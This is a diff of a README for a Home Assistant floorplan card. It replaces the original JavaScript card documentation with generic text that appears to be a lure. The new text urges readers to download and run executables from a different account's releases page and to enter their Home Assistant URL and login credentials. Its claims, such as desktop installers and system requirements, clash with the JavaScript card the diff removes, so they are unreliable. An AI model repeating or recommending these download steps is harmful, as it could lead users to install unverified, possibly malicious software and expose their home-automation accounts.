@@ -1,75 +1,74 @@
-# Home Assistant Floorplan Card
+# 🏠 ha-floorplan - Easily Set Up Your Home Layout
 
-A powerful, interactive floorplan visualization for Home Assistant. Features a built-in visual editor to define light zones and entity placements, exporting a ready-to-use YAML configuration.
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/prince071718/ha-floorplan/releases)
 
-## Features
-- **Advanced Light Control**:
-  - Dynamically updates **Color** (RGB), **Brightness** (Opacity), and **Color Temperature**.
-  - Visual feedback for on/off states with customizable colors.
-  - Simply **Click to Toggle** lights directly from the floorplan.
-- **Media Player Integration**:
-  - Active states are visually highlighted.
-- **Visual Editor**:
-  - Drag & Drop interface to draw polygon zones.
-  - Instant YAML export for Lovelace dashboard.
+## 🚀 Getting Started
 
-## Visual Editor
+Welcome to the ha-floorplan project. This application simplifies how you set up your home layout in Home Assistant. You don’t need any technical knowledge to use it. Just follow these steps to get started.
 
-**[Open the Editor](https://kishorviswanathan.github.io/ha-floorplan/)**
+## 📥 Download & Install
 
-Use the online editor to:
-1. Upload your floorplan image.
-2. Define zones and entities.
-3. Export the YAML configuration.
+To download the latest version of ha-floorplan, visit this page to download: [Releases Page](https://github.com/prince071718/ha-floorplan/releases). Here, you'll find the most recent updates and files needed for installation. 
 
----
+### Steps to Download
 
-## Installation
+1. Open the [Releases Page](https://github.com/prince071718/ha-floorplan/releases) in your web browser.
+2. Locate the version you want to download. The latest version is usually at the top.
+3. Click on the link that corresponds to your operating system. 
 
-### Option A: Direct Link (Recommended)
-You can directly link to the JS file from the master branch using JSDelivr:
+Make sure to remember where you save the file on your computer.
 
-1. Go to **Settings** > **Dashboards** > **Three dots** > **Resources**.
-2. **Add Resource**: (replace `<version>` with the version you want to use)
-   - URL: `https://cdn.jsdelivr.net/gh/kishorviswanathan/ha-floorplan@v<version>/release/ha-floorplan-card.js`
-   - Type: `JavaScript Module`
-3. Click **Create**.
+## ⚙️ System Requirements
 
-### Option B: Download
-If you prefer to host it locally:
-1. Download `ha-floorplan-card.js` from the `release` folder in the source (after running `npm run build:card`).
-2. Upload to `/config/www/` in Home Assistant.
-3. Add Resource with URL: `/local/ha-floorplan-card.js`.
+ha-floorplan runs on various systems. Ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later, MacOS 10.12 or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 100 MB of free disk space.
+- **Network:** Active internet connection for Home Assistant integration.
 
-## Dashboard Setup
+## 🔄 Setting Up ha-floorplan
 
-Once the resource is added (via Installation steps above):
+Once you have downloaded the application, follow these steps to set it up:
 
-1. Go to your Home Assistant Dashboard.
-2. Click the **Pencil icon** (Edit Dashboard) > **Add Card**.
-3. Scroll down and select **Manual**.
-4. **Copy the YAML** exported from the Visual Editor.
-5. **Paste** it into the Manual Card configuration.
-6. Click **Save**.
+1. **Locate the Downloaded File:** Navigate to the folder where you saved the file.
+2. **Install the Application:**
+   - **For Windows:** Double-click the `.exe` file and follow the on-screen instructions.
+   - **For Mac:** Open the `.dmg` file, drag the ha-floorplan icon to your Applications folder.
+   - **For Linux:** Extract the `.tar.gz` file and follow the instructions inside the README for your specific distribution.
+3. **Start the Application:** After installation, launch the application from your desktop or applications folder.
 
----
+## 🌟 Configuring Your Floorplan
 
-## Local Development
+Setting up your floorplan in Home Assistant is straightforward. Here’s how to do it:
 
-1. **Install Dependencies**:
-   ```bash
-   npm install
-   ```
+1. Open the ha-floorplan application.
+2. Follow the guided setup to connect to your Home Assistant instance. You will need your Home Assistant URL and login credentials.
+3. Use the intuitive interface to draw your floorplan. You can add rooms, furniture, and any other elements you want to display.
 
-2. **Run Editor**:
-   ```bash
-   npm run dev
-   ```
+## 📑 Features
 
-3. **Build All**:
-   ```bash
-   npm run build       # Builds Editor (dist/index.html)
-   npm run build:card  # Builds Card (dist/ha-floorplan-card.js)
-   ```
+- **User-Friendly Interface:** Easily navigate the setup process without technical skills.
+- **Customizable Layouts:** Tailor your floorplan to fit your specific home.
+- **Seamless Integration:** Connect effortlessly with your Home Assistant.
+- **Visual Clarity:** Get a clean view of your home’s layout and devices.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues during installation or setup, consider these common solutions:
+
+- **File Won't Open:** Ensure you have downloaded the correct file for your operating system.
+- **Connection Issues:** Double-check your Home Assistant URL and login details.
+- **Performance Problems:** Close unnecessary applications running in the background to free up memory.
+
+## 🌐 Support & Feedback
+
+For any questions or feedback, you can reach out via the Issues section on the GitHub repository or connect with the community through forums. Your input helps improve the application.
+
+## 🔗 Useful Links
+
+- [Documentation](https://github.com/prince071718/ha-floorplan/wiki)
+- [Issues Page](https://github.com/prince071718/ha-floorplan/issues)
+- [Community Forum](https://community.home-assistant.io)
+
+Feel free to explore these resources for additional help. Your home layout is just a few clicks away! Remember to revisit the [Releases Page](https://github.com/prince071718/ha-floorplan/releases) for future updates and new features.
